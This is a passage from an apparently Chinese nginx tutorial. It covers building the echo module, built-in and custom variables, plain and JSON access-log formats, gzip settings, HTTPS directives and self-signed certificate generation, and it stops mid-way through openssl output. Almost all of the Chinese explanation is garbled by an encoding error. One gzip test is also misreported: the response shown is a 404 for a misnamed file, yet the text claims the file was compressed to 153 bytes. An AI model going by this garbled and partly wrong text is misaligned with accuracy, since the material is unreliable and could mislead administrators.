ï¼Œæœ‰çš„æ¨¡å—æ˜¯ç”±å…¬å¸çš„å¼€å‘äººå‘˜é’ˆå¯¹ä¸šåŠ¡éœ€æ±‚å®šåˆ¶å¼€å‘çš„ï¼Œæœ‰çš„æ¨¡å—æ˜¯å¼€æºçˆ±å¥½è€…å¼€å‘å¥½ä¹‹åä¸Šä¼ åˆ°githubè¿›è¡Œå¼€æºçš„æ¨¡å—ï¼Œnginxçš„ç¬¬ä¸‰æ–¹æ¨¡å—éœ€è¦ä»æºç é‡æ–°ç¼–è¯‘è¿›è¡Œæ”¯æŒ\næ¯”å¦‚:å¼€æºçš„echoæ¨¡å— https:/github.com/openresty/echo-nginx-module\nç¤ºä¾‹ï¼šæ·»åŠ ç¬¬ä¸‰æ–¹æ¨¡å— echo-nginx-module\n#é…ç½®è™šæ‹Ÿä¸»æœºä½¿ç”¨echo-nginx-moduleæ¨¡å— [root@centos7 conf.d]# cat pc.conf server { listen 80 default_server; server_name pc.test.org; location /main { index index.html; default_type text/html; echo \u0026#34;hello world--\u0026gt;\u0026#34;; echo $remote_addr; echo_reset_timer; #å°†è®¡æ—¶å™¨å¼€å§‹æ—¶é—´é‡ç½®ä¸ºå½“å‰æ—¶é—´ echo_location /sub1; echo_location /sub2; echo \u0026#34;took $echo_time_elapsed sed for total.\u0026#34;; } } location /sub1 { echo_sleep 1; echo sub1; } location /sub2 { echo_sleep 1; echo sub2; } #è¯­æ³•æ£€æŸ¥æŠ¥é”™ [root@centos7 conf.d]# nginx -t nginx: [emerg] unknown directive \u0026#34;echo\u0026#34; in /apps/nginx/conf.d/pc.conf:8 #ä¸æ”¯æŒechoæ¨¡å— nginx: configuration file /apps/nginx/conf/nginx.conf test failed #æŸ¥çœ‹å½“å‰nginxå¹¶æœªæ·»åŠ echo-nginx-moduleæ¨¡å— [root@centos7 conf.d]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module ###ä¸‹è½½echo-nginx-muduleæ¨¡å—ï¼Œé‡æ–°ç¼–è¯‘nginxå¹¶æ·»åŠ æ­¤æ¨¡å— [root@centos7 src]# nginx -s stop #åœæ­¢è€ç‰ˆæœ¬nginx [root@centos7 conf.d]# cd /usr/local/src [root@centos7 src]# git clone https:/github.com/openresty/echo-nginx-module.git [root@centos7 nginx-1.18.0]# ./configure \\ --prefix=/apps/nginx \\ --user=nginx --group=nginx \\ --with-http_ssl_module \\ --with-http_v2_module \\ --with-http_realip_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_realip_module \\ --with-http_perl_module \\ --add-module=/usr/local/src/echo-nginx-module #æŒ‡å®šæ¨¡å—æºä»£ç è·¯å¾„ [root@centos7 src]# make \u0026amp;\u0026amp; make install root@centos7 nginx-1.18.0]# /apps/nginx/sbin/nginx -t #è¯­æ³•æ£€æŸ¥é€šè¿‡ nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 nginx-1.18.0]# /apps/nginx/sbin/nginx -V #æŸ¥çœ‹ç¼–è¯‘åçš„æ–°ç‰ˆæœ¬ nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module #è®¿é—®æµ‹è¯• [root@centos7 nginx-1.18.0]# nginx [root@centos7 nginx-1.18.0]# curl pc.test.org/main/ hello world--\u0026gt; 172.16.16.88 sub1 sub2 took 2.009 sed for total. Nginx ä½¿ç”¨å˜é‡ nginxçš„å˜é‡å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œä½œä¸ºåŠŸèƒ½åˆ¤æ–­æˆ–è€…æ—¥å¿—ç­‰åœºæ™¯ä½¿ç”¨\nå˜é‡å¯ä»¥åˆ†ä¸ºå†…ç½®å˜é‡å’Œè‡ªå®šä¹‰å˜é‡\nå†…ç½®å˜é‡æ˜¯ç”±nginxæ¨¡å—è‡ªå¸¦ï¼Œé€šè¿‡å˜é‡å¯ä»¥è·å–åˆ°ä¼—å¤šçš„ä¸å®¢æˆ·ç«¯è®¿é—®ç›¸å…³çš„å€¼ã€‚\nå†…ç½®å˜é‡ å®˜æ–¹æ–‡æ¡£ http:/nginx.org/en/docs/varindex.html\nå¸¸ç”¨å†…ç½®å˜é‡\n$remote_addr; #å­˜æ”¾äº†å®¢æˆ·ç«¯çš„åœ°å€ï¼Œæ³¨æ„æ˜¯å®¢æˆ·ç«¯çš„å…¬ç½‘IP $proxy_add_x_forwarded_for #æ­¤å˜é‡è¡¨ç¤ºå°†å®¢æˆ·ç«¯IPè¿½åŠ è¯·æ±‚æŠ¥æ–‡ä¸­X-Forwarded-Foré¦–éƒ¨å­—æ®µ,å¤šä¸ªIPä¹‹é—´ç”¨é€—å·åˆ†éš”,å¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰X-Forwarded-For, å°±ä½¿ç”¨$remote_addr the â€œX-Forwarded-Forâ€ client request header field with the $remote_addr variable appended to it, separated by a comma. If the â€œX-Forwarded-Forâ€ field is not present in the client request header, the $proxy_add_x_forwarded_for variable is equal to the $remote_addr variable. $args; #å­˜æ”¾äº†URLä¸­çš„æ‰€æœ‰å‚æ•°ï¼Œä¾‹å¦‚:å¯¹äºhttp:/www.magedu.org/main/index.do?id=20190221\u0026amp;partner=search $argsçš„å€¼å°±æ˜¯ï¼šid=20190221\u0026amp;partner=search $document_root; #ä¿å­˜äº†é’ˆå¯¹å½“å‰èµ„æºçš„è¯·æ±‚çš„ç³»ç»Ÿæ ¹ç›®å½•,ä¾‹å¦‚:/apps/nginx/htmlã€‚ $document_uri; #ä¿å­˜äº†å½“å‰è¯·æ±‚ä¸­ä¸åŒ…å«å‚æ•°çš„URIï¼Œæ³¨æ„æ˜¯ä¸åŒ…å«è¯·æ±‚çš„æŒ‡ä»¤ï¼Œæ¯”å¦‚:http:/www.magedu.org/main/index.do?id=20190221\u0026amp;partner=searchä¼šè¢«å®šä¹‰ä¸º/main/index.do #$document_uriçš„å€¼ä¸º:/main/index.do $host; #å­˜æ”¾äº†è¯·æ±‚çš„hoståç§° $limit_rate; #å¦‚æœnginxæœåŠ¡å™¨ä½¿ç”¨limit_rateé…ç½®äº†æ˜¾ç¤ºç½‘ç»œé€Ÿç‡ï¼Œåˆ™ä¼šæ˜¾ç¤ºï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œ åˆ™æ˜¾ç¤º0 $remote_port; #å®¢æˆ·ç«¯è¯·æ±‚NginxæœåŠ¡å™¨æ—¶éšæœºæ‰“å¼€çš„ç«¯å£ï¼Œè¿™æ˜¯æ¯ä¸ªå®¢æˆ·ç«¯è‡ªå·±çš„ç«¯å£ $remote_user; #å·²ç»ç»è¿‡Auth Basic ModuleéªŒè¯çš„ç”¨æˆ·å $request_body_file; #åšåå‘ä»£ç†æ—¶å‘ç»™åç«¯æœåŠ¡å™¨çš„æœ¬åœ°èµ„æºçš„åç§° $request_method; #è¯·æ±‚èµ„æºçš„æ–¹å¼ï¼ŒGET/PUT/DELETEç­‰ $request_filename; #å½“å‰è¯·æ±‚çš„èµ„æºæ–‡ä»¶çš„ç£ç›˜è·¯å¾„ï¼Œç”±rootæˆ–aliasæŒ‡ä»¤ä¸URIè¯·æ±‚ç”Ÿæˆçš„æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œå¦‚:/apps/nginx/html/main/index.html $request_uri; #åŒ…å«è¯·æ±‚å‚æ•°çš„åŸå§‹URIï¼Œä¸åŒ…å«ä¸»æœºåï¼Œç›¸å½“äº:$document_uri?$args,ä¾‹å¦‚ï¼š/main/index.do?id=20190221\u0026amp;partner=search $scheme; #è¯·æ±‚çš„åè®®ï¼Œä¾‹å¦‚:httpï¼Œhttps,ftpç­‰ $server_protocol; #ä¿å­˜äº†å®¢æˆ·ç«¯è¯·æ±‚èµ„æºä½¿ç”¨çš„åè®®çš„ç‰ˆæœ¬ï¼Œä¾‹å¦‚:HTTP/1.0ï¼ŒHTTP/1.1ï¼ŒHTTP/2.0ç­‰ $server_addr; #ä¿å­˜äº†æœåŠ¡å™¨çš„IPåœ°å€ $server_name; #è¯·æ±‚çš„æœåŠ¡å™¨çš„ä¸»æœºå $server_port; #è¯·æ±‚çš„æœåŠ¡å™¨çš„ç«¯å£å· $http_user_agent; #å®¢æˆ·ç«¯æµè§ˆå™¨çš„è¯¦ç»†ä¿¡æ¯ $http_cookie; #å®¢æˆ·ç«¯çš„æ‰€æœ‰cookieä¿¡æ¯ $cookie_\u0026lt;name\u0026gt; #cookieä¸­æŸä¸ªå­—æ®µå€¼ï¼Œnameä¸ºä»»æ„è¯·æ±‚æŠ¥æ–‡é¦–éƒ¨å­—éƒ¨cookieçš„key $http_\u0026lt;name\u0026gt; #nameä¸ºä»»æ„è¯·æ±‚æŠ¥æ–‡é¦–éƒ¨å­—æ®µ,è¡¨ç¤ºè®°å½•è¯·æ±‚æŠ¥æ–‡çš„é¦–éƒ¨å­—æ®µï¼Œnameçš„å¯¹åº”çš„é¦–éƒ¨å­—æ®µåéœ€è¦ä¸ºå°å†™ï¼Œå¦‚æœæœ‰æ¨ªçº¿éœ€è¦æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ã€‚ #ç¤ºä¾‹: echo $http_user_agent; echo $http_host; $sent_http_\u0026lt;name\u0026gt; #nameä¸ºå“åº”æŠ¥æ–‡çš„é¦–éƒ¨å­—æ®µï¼Œnameçš„å¯¹åº”çš„é¦–éƒ¨å­—æ®µåéœ€è¦ä¸ºå°å†™ï¼Œå¦‚æœæœ‰æ¨ªçº¿éœ€è¦æ›¿æ¢ä¸ºä¸‹åˆ’çº¿,æ­¤å˜é‡æœ‰é—®é¢˜ #ç¤ºä¾‹ï¼š echo $sent_http_server; $arg_\u0026lt;name\u0026gt; #æ­¤å˜é‡å­˜æ”¾äº†URLä¸­çš„æŒ‡å®šå‚æ•°ï¼Œnameä¸ºè¯·æ±‚urlä¸­æŒ‡å®šçš„å‚æ•°å #ç¤ºä¾‹ echo $arg_id; èŒƒä¾‹ï¼š\n##ç«™ç‚¹é…ç½® [root@centos7 ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80 default_server; server_name pc.test.org; location /main { index index.html; default_type text/html; echo $remote_addr; echo $args; echo $document_root; echo $document_uri; echo $host; echo $http_user_agent; echo $http_cookie; echo $request_filename; echo $scheme; echo $scheme:/$host$document_uri?$args; } } ##è¿”å›ç»“æœ [root@centos7 ~]# curl -b title=test \u0026#39;http:/pc.test.org/main/index.do?id=2022\u0026amp;partner=search\u0026#39; 172.16.16.88 id=2022\u0026amp;partner=search /apps/nginx/html /main/index.do pc.test.org curl/7.29.0 title=test /apps/nginx/html/main/index.do http http:/pc.test.org/main/index.do?id=2022\u0026amp;partner=search èŒƒä¾‹ï¼š\n##ç«™ç‚¹é…ç½® [root@centos7 ~]# cat /apps/nginx/conf.d/www.conf server { listen 80; server_name www.test.com; location /echo { echo $request; echo $proxy_add_x_forwarded_for; echo $args; echo $document_uri; echo $request_uri; echo $document_root; echo $host; echo $request_method; echo $request_filename; echo $scheme; set $test $http_host; #è‡ªå®šä¹‰å˜é‡ï¼Œå°†$http_hostçš„å€¼èµ‹ç»™testå˜é‡ echo $test; echo $http_User_Agent; echo $http_cookie; echo $cookie_key1; } } ##è®¿é—®æµ‹è¯• [root@centos7 ~]# curl -b \u0026#39;key1=v1;key2=v2\u0026#39; \u0026#34;http:/www.test.com/echo/index.html?id=666\u0026amp;partner=search\u0026#34; GET /echo/index.html?id=666\u0026amp;partner=search HTTP/1.1 172.16.16.88 id=666\u0026amp;partner=search /echo/index.html /echo/index.html?id=666\u0026amp;partner=search /apps/nginx/html www.test.com GET /apps/nginx/html/echo/index.html http www.test.com curl/7.29.0 key1=v1;key2=v2 v1 è‡ªå®šä¹‰å˜é‡ è¯­æ³•æ ¼å¼ï¼š\nSyntax: set $variable value; Default: â€” Context: server, location, if èŒƒä¾‹ï¼š\n##ç«™ç‚¹é…ç½® [root@centos7 ~]# cat /apps/nginx/conf.d/www.conf server { listen 80; server_name www.test.com; location /echo { set $name test; echo $name; set $my_port $server_port; echo $my_port; echo \u0026#34;server_name:$server_port\u0026#34;; } } ##è®¿é—®æµ‹è¯• [root@centos7 ~]# curl www.test.com/echo GET /echo HTTP/1.1 172.16.16.88 /echo /echo /apps/nginx/html www.test.com GET /apps/nginx/html/echo http www.test.com curl/7.29.0 Nginx è‡ªå®šä¹‰è®¿é—®æ—¥å¿— è®¿é—®æ—¥å¿—æ˜¯è®°å½•å®¢æˆ·ç«¯å³ç”¨æˆ·çš„å…·ä½“è¯·æ±‚å†…å®¹ä¿¡æ¯ï¼Œè€Œåœ¨å…¨å±€é…ç½®æ¨¡å—ä¸­çš„error_logæ˜¯è®°å½•nginxæœåŠ¡å™¨è¿è¡Œæ—¶çš„æ—¥å¿—ä¿å­˜è·¯å¾„å’Œæ—¥å¿—çš„levelï¼Œä¸¤è€…æ˜¯ä¸åŒçš„ï¼Œè€Œä¸”Nginxçš„é”™è¯¯æ—¥å¿—ä¸€èˆ¬åªæœ‰ä¸€ä¸ªï¼Œä½†æ˜¯è®¿é—®æ—¥å¿—å¯ä»¥åœ¨ä¸åŒçš„serverä¸­å®šä¹‰å¤šä¸ªã€‚å®šä¹‰è®¿é—®æ—¥å¿—ä½¿ç”¨access_logæŒ‡ä»¤æŒ‡å®šæ—¥å¿—ä¿å­˜è·¯å¾„ï¼Œä½¿ç”¨log_formatæŒ‡å®šæ—¥å¿—çš„æ ¼å¼ï¼Œæ ¼å¼ä¸­å®šä¹‰è¦ä¿å­˜çš„å…·ä½“çš„æ—¥å¿—å†…å®¹ã€‚\nè®¿é—®æ—¥å¿—ç”± ngx_http_log_module æ¨¡å—å®ç°\nå®˜æ–¹å¸®åŠ©æ–‡æ¡£ï¼šhttp:/nginx.org/en/docs/http/ngx_http_log_module.html\nè¯­æ³•æ ¼å¼ï¼š\nSyntax: access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; access_log off; Default: access_log logs/access.log combined; Context: http, server, location, if in location, limit_except è‡ªå®šä¹‰æ—¥å¿—é»˜è®¤æ ¼å¼ å¦‚æœè¦ä¿ç•™æ—¥å¿—çš„æºæ ¼å¼ï¼Œåªéœ€æ·»åŠ ç›¸åº”çš„æ—¥å¿—å†…å®¹ï¼Œé…ç½®å¦‚ä¸‹ï¼š\nhttp { ... log_format my_nginx_format \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34;\u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34;\u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39; \u0026#39;$server_name:$server_port\u0026#39;; access_log logs/access.log my_nginx_format; ... } #æ³¨æ„ï¼šæ­¤æŒ‡ä»¤ä¸€å®šè¦æ”¾åœ¨log_formatå‘½ä»¤åï¼ˆnginxé…ç½®ä»ä¸Šè‡³ä¸‹ä¾æ¬¡ç”Ÿæ•ˆï¼‰ access_log logs/access.log my_nginx_format; ##é‡å¯nginxè®¿é—®æµ‹è¯• [root@centos7 nginx]# tail -3 logs/access.log 172.16.16.88 - - [02/Aug/2022:23:51:26 +0800] \u0026#34;GET /echo HTTP/1.1\u0026#34; 200 211 \u0026#34;-\u0026#34; \u0026#34;curl/7.29.0\u0026#34; #é»˜è®¤æ—¥å¿—æ ¼å¼ 172.16.16.88 - - [04/Aug/2022:19:08:42 +0800] \u0026#34;GET / HTTP/1.1\u0026#34;200 6 \u0026#34;-\u0026#34;\u0026#34;curl/7.29.0\u0026#34; \u0026#34;-\u0026#34;pc.test.org:80 #è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼my_nginx_format è‡ªå®šä¹‰jsonæ ¼å¼æ—¥å¿— nginxçš„é»˜è®¤æ—¥å¿—æ ¼å¼è®°å½•çš„å†…å®¹ç›¸å¯¹å•ä¸€ï¼Œä¸”é»˜è®¤çš„æ ¼å¼ä¹Ÿä¸æ–¹ä¾¿åæœŸåšæ—¥å¿—ç»Ÿè®¡åˆ†æï¼Œç”Ÿäº§ç¯å¢ƒä¸­é€šå¸¸å°†nginxæ—¥å¿—æ ¼å¼ä¸ºjsonæ ¼å¼ï¼Œç„¶åé…åˆELKåšæ—¥å¿—æ”¶é›†ã€ç»Ÿè®¡å’Œåˆ†æã€‚\né…ç½®ç¤ºä¾‹ï¼š\nhttp { ... log_format json_log \u0026#39;{\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;clientip\u0026#34;:\u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;size\u0026#34;:$body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;responsetime\u0026#34;:$request_time,\u0026#39; \u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;$upstream_response_time\u0026#34;,\u0026#39; \u0026#39;\u0026#34;upstreamhost\u0026#34;:\u0026#34;$upstream_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_host\u0026#34;:\u0026#34;$host\u0026#34;,\u0026#39; \u0026#39;\u0026#34;uri\u0026#34;:\u0026#34;$uri\u0026#34;,\u0026#39; \u0026#39;\u0026#34;xff\u0026#34;:\u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;tcp_xff\u0026#34;:\u0026#34;$proxy_protocol_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_user_agent\u0026#34;:\u0026#34;$http_user_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;:\u0026#34;$status\u0026#34;}\u0026#39;; access_log logs/access.log json_log; ... } ##é‡å¯nginxï¼ŒæŸ¥çœ‹ç”Ÿæˆçš„æ—¥å¿—æ ¼å¼ [root@centos7 nginx]# tail -1 logs/access.log {\u0026#34;@timestamp\u0026#34;:\u0026#34;2022-08-04T19:27:18+08:00\u0026#34;,\u0026#34;clientip\u0026#34;:\u0026#34;127.0.0.1\u0026#34;,\u0026#34;size\u0026#34;:6,\u0026#34;responsetime\u0026#34;:0.000,\u0026#34;upstreamtime\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;upstreamhost\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;http_host\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;uri\u0026#34;:\u0026#34;/index.html\u0026#34;,\u0026#34;xff\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;referer\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;tcp_xff\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;http_user_agent\u0026#34;:\u0026#34;curl/7.29.0\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;200\u0026#34; Nginx å‹ç¼©åŠŸèƒ½ Nginxæ”¯æŒå¯¹æŒ‡å®šç±»å‹çš„æ–‡ä»¶è¿›è¡Œå‹ç¼©ç„¶åå†ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œè€Œä¸”å‹ç¼©è¿˜å¯ä»¥è®¾ç½®å‹ç¼©æ¯”ä¾‹ï¼Œå‹ç¼©åçš„\næ–‡ä»¶å¤§å°å°†æ¯”æºæ–‡ä»¶æ˜¾è‘—å˜å°ï¼Œè¿™æ ·æœ‰åŠ©äºé™ä½å‡ºå£å¸¦å®½çš„åˆ©ç”¨ç‡ï¼Œé™ä½ä¼ä¸šçš„ITæ”¯å‡ºï¼Œä¸è¿‡ä¼šå ç”¨ç›¸\nåº”çš„CPUèµ„æºã€‚\nNginxå¯¹æ–‡ä»¶çš„å‹ç¼©åŠŸèƒ½æ˜¯ä¾èµ–äºæ¨¡å— ngx_http_gzip_module,é»˜è®¤æ˜¯å†…ç½®æ¨¡å—\nå®˜æ–¹æ–‡æ¡£ï¼šhttps:/nginx.org/en/docs/http/ngx_http_gzip_module.html\næ ¼å¼ï¼š\nSyntax:\tgzip on | off; Default:\tgzip off; Context:\thttp, server, location, if in location ç›¸å…³æŒ‡ä»¤ï¼š\n#å¯ç”¨æˆ–ç¦ç”¨gzipå‹ç¼©ï¼Œé»˜è®¤å…³é—­ gzip on | off; #å‹ç¼©æ¯”ç”±ä½åˆ°é«˜ä»1åˆ°9ï¼Œé»˜è®¤ä¸º1 gzip_comp_level level; #ç¦ç”¨IE6 gzipåŠŸèƒ½ gzip_disable \u0026#34;MSIE [1-6]\\.\u0026#34;; #gzipå‹ç¼©çš„æœ€å°æ–‡ä»¶ï¼Œå°äºè®¾ç½®å€¼çš„æ–‡ä»¶å°†ä¸ä¼šå‹ç¼© gzip_min_length 1k; #å¯ç”¨å‹ç¼©åŠŸèƒ½æ—¶ï¼Œåè®®çš„æœ€å°ç‰ˆæœ¬ï¼Œé»˜è®¤HTTP/1.1 gzip_http_version 1.0 | 1.1; #æŒ‡å®šNginxæœåŠ¡éœ€è¦å‘æœåŠ¡å™¨ç”³è¯·çš„ç¼“å­˜ç©ºé—´çš„ä¸ªæ•°å’Œå¤§å°,å¹³å°ä¸åŒ,é»˜è®¤:32 4kæˆ–è€…16 8k; gzip_buffers number size; #æŒ‡æ˜ä»…å¯¹å“ªäº›ç±»å‹çš„èµ„æºæ‰§è¡Œå‹ç¼©æ“ä½œ;é»˜è®¤ä¸ºgzip_types text/htmlï¼Œä¸ç”¨æ˜¾ç¤ºæŒ‡å®šï¼Œå¦åˆ™å‡ºé”™ gzip_types mime-type ...; #å¦‚æœå¯ç”¨å‹ç¼©ï¼Œæ˜¯å¦åœ¨å“åº”æŠ¥æ–‡é¦–éƒ¨æ’å…¥â€œVary: Accept-Encodingâ€,ä¸€èˆ¬å»ºè®®æ‰“å¼€ gzip_vary on | off; #é¢„å‹ç¼©ï¼Œå³ç›´æ¥ä»ç£ç›˜æ‰¾åˆ°å¯¹åº”æ–‡ä»¶çš„gzåç¼€çš„å¼çš„å‹ç¼©æ–‡ä»¶è¿”å›ç»™ç”¨æˆ·ï¼Œæ— éœ€æ¶ˆè€—æœåŠ¡å™¨CPU #æ³¨æ„: æ¥è‡ªäºngx_http_gzip_static_moduleæ¨¡å— gzip_static on | off; ç¤ºä¾‹ï¼š\n##åˆ†åˆ«ç”Ÿæˆ5Bytes å¤§å°çš„index.htmlæ–‡ä»¶ä»¥åŠ2kå¤§å°çš„2k.text [root@centos7 ~]# echo test \u0026gt; /apps/nginx/html/pc/index.html [root@centos7 ~]# dd if=/dev/zero of=/apps/nginx/html/pc/2k.text bs=2k count=1 1+0 records in 1+0 records out 2048 bytes (2.0 kB) copied, 0.000405459 s, 5.1 MB/s [root@centos7 ~]# ll /apps/nginx/html/pc/2k.text -h -rw-r--r-- 1 root root 2.0K Aug 4 20:01 /apps/nginx/html/pc/2k.text [root@centos7 ~]# ll /apps/nginx/html/pc/index.html -h -rw-r--r-- 1 nginx nginx 5 Aug 4 19:43 /apps/nginx/html/pc/index.html #å‡†å¤‡ç«™ç‚¹é…ç½® [root@centos7 ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80 default_server; server_name pc.test.org; gzip on; gzip_comp_level 5; gzip_min_length 1k; #å°äº1kçš„æ–‡ä»¶ä¸å‹ç¼© gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/gif image/png; gzip_vary on; location / { index index.html; default_type text/html; root html/pc; } } [root@centos7 ~]# nginx -s reload [root@centos7 ~]# curl -I --compressed pc.test.org/index.html HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 04 Aug 2022 12:02:22 GMT Content-Type: text/html Content-Length: 5 #index.htmlæ–‡ä»¶æœªå‹ç¼©ï¼Œä»æ˜¯5Bytes Last-Modified: Thu, 04 Aug 2022 11:43:47 GMT Connection: keep-alive Keep-Alive: timeout=60 ETag: \u0026#34;62ebb0f3-5\u0026#34; Accept-Ranges: bytes [root@centos7 ~]# curl -I --compressed pc.test.org/2k.txt HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Thu, 04 Aug 2022 12:02:34 GMT Content-Type: text/html Content-Length: 153 #2k.txtè¢«å‹ç¼©ä¸º153Bytes Connection: keep-alive Keep-Alive: timeout=60 Nginx é…ç½®https https ç›¸å…³å‚æ•° nginx çš„https åŠŸèƒ½åŸºäºæ¨¡å—ngx_http_ssl_moduleå®ç°ï¼Œä½œä¸ºnginxçš„æ ¸å¿ƒåŠŸèƒ½ï¼Œyumå®‰è£…çš„nginxé»˜è®¤å°±æ˜¯å¼€å¯çš„ï¼Œç¼–è¯‘å®‰è£…çš„nginxéœ€è¦æŒ‡å®šç¼–è¯‘å‚æ•°\u0026ndash;with-http_ssl_moduleå¼€å¯ã€‚\nå®˜æ–¹æ–‡æ¡£ï¼šhttps:/nginx.org/en/docs/http/ngx_http_ssl_module.html\nç›¸å…³æŒ‡ä»¤ï¼š\n#ä¸ºæŒ‡å®šçš„è™šæ‹Ÿä¸»æœºé…ç½®æ˜¯å¦å¯ç”¨sslåŠŸèƒ½ï¼Œæ­¤åŠŸèƒ½åœ¨1.15.0åºŸå¼ƒï¼Œä½¿ç”¨listen [ssl]æ›¿ä»£ ssl on | off; listen 443 ssl; #æŒ‡å‘åŒ…å«å½“å‰è™šæ‹Ÿä¸»æœºå’ŒCAçš„ä¸¤ä¸ªè¯ä¹¦ä¿¡æ¯çš„æ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯crtæ–‡ä»¶ ssl_certificate /path/to/file; #å½“å‰è™šæ‹Ÿä¸»æœºä½¿ç”¨çš„ç§é’¥æ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯keyæ–‡ä»¶ ssl_certificate_key /path/to/file; #æ”¯æŒsslåè®®ç‰ˆæœ¬ï¼Œæ—©æœŸä¸ºsslç°åœ¨æ˜¯TLSï¼Œé»˜è®¤ä¸ºåä¸‰ä¸ª #é…ç½®sslç¼“å­˜ ssl_session_cache off | none | [builtin[:size]] [shared:name:size]; offï¼š #å…³é—­ç¼“å­˜ none: #é€šçŸ¥å®¢æˆ·ç«¯æ”¯æŒssl session cacheï¼Œä½†å®é™…ä¸æ”¯æŒ builtin[:size]ï¼š#ä½¿ç”¨OpenSSLå†…å»ºç¼“å­˜ï¼Œä¸ºæ¯workerè¿›ç¨‹ç§æœ‰ [shared:name:size]ï¼š#åœ¨å„workerä¹‹é—´ä½¿ç”¨ä¸€ä¸ªå…±äº«çš„ç¼“å­˜ï¼Œéœ€è¦å®šä¹‰ä¸€ä¸ªç¼“å­˜åç§°å’Œç¼“å­˜ç©ºé—´å¤§å°ï¼Œä¸€å…†å¯ä»¥å­˜å‚¨4000ä¸ªä¼šè¯ä¿¡æ¯ï¼Œå¤šä¸ªè™šæ‹Ÿä¸»æœºå¯ä»¥ä½¿ç”¨ç›¸åŒçš„ç¼“å­˜åç§° #å®¢æˆ·ç«¯è¿æ¥å¯ä»¥å¤ç”¨ssl session cacheä¸­ç¼“å­˜çš„æœ‰æ•ˆæ—¶é•¿ï¼Œé»˜è®¤5m ssl_session_timeout time; è‡ªç­¾åè¯ä¹¦ ç”Ÿæˆè‡ªç­¾åè¯ä¹¦\n##è¿›å…¥nginxå®‰è£…ç›®å½•ï¼Œæ–°å»ºå­˜æ”¾è¯ä¹¦çš„ç›®å½• [root@centos7 ~]# cd /apps/nginx/ [root@centos7 nginx]# mkdir certs [root@centos7 nginx]# cd certs/ ##ç”Ÿæˆè‡ªç­¾åCAè¯ä¹¦ca.crtå’Œç§é’¥ca.key [root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 3650 -out ca.crt Generating a 4096 bit RSA private key ...........................................................................................++ ................................................................................................................................................................................++ writing new private key to \u0026#39;ca.key\u0026#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [XX]:cn State or Province Name (full name) []:sichuan Locality Name (eg, city) [Default City]:chengdu Organization Name (eg, company) [Default Company Ltd]:nginx Organizational Unit Name (eg, section) []:nginx.com Common Name (eg, your name or your server\u0026#39;s hostname) []:www.nginx.com Email Address []:22@qq.com [root@centos7 certs]# ls ca.crt ca.key ##ç”Ÿæˆç½‘ç«™ç§é’¥www.nginx.com.keyå’Œè¯ä¹¦è¯·æ±‚www.nginx.com.csr [root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout www.nginx.com.key -out www.nginx.com.csr Generating a 4096 bit RSA private key .......++ ...................................................................................++ writing new private key to \u0026#39;www.nginx.com.key\u0026#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left 